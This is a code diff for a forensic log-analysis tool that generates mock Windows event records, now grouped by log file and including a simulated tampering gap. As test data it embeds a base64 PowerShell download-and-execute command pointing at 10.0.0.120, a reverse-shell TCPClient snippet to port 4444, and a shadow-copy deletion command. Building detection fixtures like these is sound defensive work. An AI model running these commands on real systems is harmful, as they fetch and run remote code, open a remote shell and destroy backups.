@@ -1,22 +1,24 @@
 from datetime import datetime, timedelta
-from typing import List
+from typing import Dict, List
 
 from nevtx.analysis.mitre import MitreEngine
 from nevtx.core.models import EventRecord
 
 
-def generate_mock_events() -> List[EventRecord]:
-    """Generates realistic DFIR Windows Event Log records for demonstration & testing."""
+def generate_mock_events_by_file() -> Dict[str, List[EventRecord]]:
+    """Generates realistic DFIR Windows Event Log records categorized by log file,
+    including intentional anti-forensics log gaps."""
     now = datetime.now()
 
     # Base64 encoded payload: "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.120/rev.ps1')"
-    # UTF-16LE encoded in base64:
     b64_powershell = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAwAC4AMQAyADAALwByAGUAdgAuAHAAcwAxACcAKQA="
 
+    # Notice the intentional 45-minute log gap between 101 and 102!
     raw_list = [
         {
+            "file": "Security.evtx",
             "record_id": 101,
-            "timestamp": now - timedelta(minutes=60),
+            "timestamp": now - timedelta(minutes=90),
             "event_id": 4624,
             "provider": "Microsoft-Windows-Security-Auditing",
             "channel": "Security",
@@ -30,7 +32,9 @@ def generate_mock_events() -> List[EventRecord]:
             },
             "summary": "Logon: CORP\\jdoe (Type: 2 - Interactive)",
         },
+        # 45-minute silence (Log Gap / Tampering window)
         {
+            "file": "Security.evtx",
             "record_id": 102,
             "timestamp": now - timedelta(minutes=45),
             "event_id": 4625,
@@ -48,8 +52,9 @@ def generate_mock_events() -> List[EventRecord]:
             "summary": "Failed Logon: Administrator (Status: 0xC000006D - Bad Password)",
         },
         {
+            "file": "Security.evtx",
             "record_id": 103,
-            "timestamp": now - timedelta(minutes=30),
+            "timestamp": now - timedelta(minutes=35),
             "event_id": 4688,
             "provider": "Microsoft-Windows-Security-Auditing",
             "channel": "Security",
@@ -63,8 +68,9 @@ def generate_mock_events() -> List[EventRecord]:
             "summary": "Process: cmd.exe /c whoami /priv",
         },
         {
+            "file": "Security.evtx",
             "record_id": 104,
-            "timestamp": now - timedelta(minutes=25),
+            "timestamp": now - timedelta(minutes=30),
             "event_id": 4688,
             "provider": "Microsoft-Windows-Security-Auditing",
             "channel": "Security",
@@ -78,8 +84,9 @@ def generate_mock_events() -> List[EventRecord]:
             "summary": f"Process: powershell.exe -enc {b64_powershell[:35]}...",
         },
         {
-            "record_id": 105,
-            "timestamp": now - timedelta(minutes=20),
+            "file": "PowerShell.evtx",
+            "record_id": 201,
+            "timestamp": now - timedelta(minutes=28),
             "event_id": 4104,
             "provider": "Microsoft-Windows-PowerShell",
             "channel": "Microsoft-Windows-PowerShell/Operational",
@@ -91,8 +98,9 @@ def generate_mock_events() -> List[EventRecord]:
             "summary": "ScriptBlock: $client = New-Object System.Net.Sockets.TCPClient('10.0.0.120', 4444)...",
         },
         {
-            "record_id": 106,
-            "timestamp": now - timedelta(minutes=15),
+            "file": "Security.evtx",
+            "record_id": 105,
+            "timestamp": now - timedelta(minutes=20),
             "event_id": 4688,
             "provider": "Microsoft-Windows-Security-Auditing",
             "channel": "Security",
@@ -106,8 +114,9 @@ def generate_mock_events() -> List[EventRecord]:
             "summary": "Process: vssadmin.exe delete shadows /all /quiet",
         },
         {
-            "record_id": 107,
-            "timestamp": now - timedelta(minutes=10),
+            "file": "System.evtx",
+            "record_id": 301,
+            "timestamp": now - timedelta(minutes=15),
             "event_id": 7045,
             "provider": "Service Control Manager",
             "channel": "System",
@@ -122,7 +131,8 @@ def generate_mock_events() -> List[EventRecord]:
             "summary": "New Service: WindowsUpdaterSvc -> C:\\Users\\Public\\updater.exe",
         },
         {
-            "record_id": 108,
+            "file": "Security.evtx",
+            "record_id": 106,
             "timestamp": now - timedelta(minutes=2),
             "event_id": 1102,
             "provider": "Microsoft-Windows-Eventlog",
@@ -137,7 +147,13 @@ def generate_mock_events() -> List[EventRecord]:
         },
     ]
 
-    events: List[EventRecord] = []
+    files_map: Dict[str, List[EventRecord]] = {
+        "📁 [All Files - Merged Timeline]": [],
+        "Security.evtx": [],
+        "System.evtx": [],
+        "PowerShell.evtx": [],
+    }
+
     for item in raw_list:
         data = item["data"]
         event_id = item["event_id"]
@@ -161,6 +177,16 @@ def generate_mock_events() -> List[EventRecord]:
             mitre_matches=mitre_matches,
             decoded_payloads=decoded,
         )
-        events.append(rec)
 
-    return events
+        files_map["📁 [All Files - Merged Timeline]"].append(rec)
+        files_map[item["file"]].append(rec)
+
+    # Sort merged timeline chronologically
+    files_map["📁 [All Files - Merged Timeline]"].sort(key=lambda r: r.timestamp or datetime.min)
+
+    return files_map
+
+
+def generate_mock_events() -> List[EventRecord]:
+    """Compatibility helper returning all mock events."""
+    return generate_mock_events_by_file()["📁 [All Files - Merged Timeline]"]
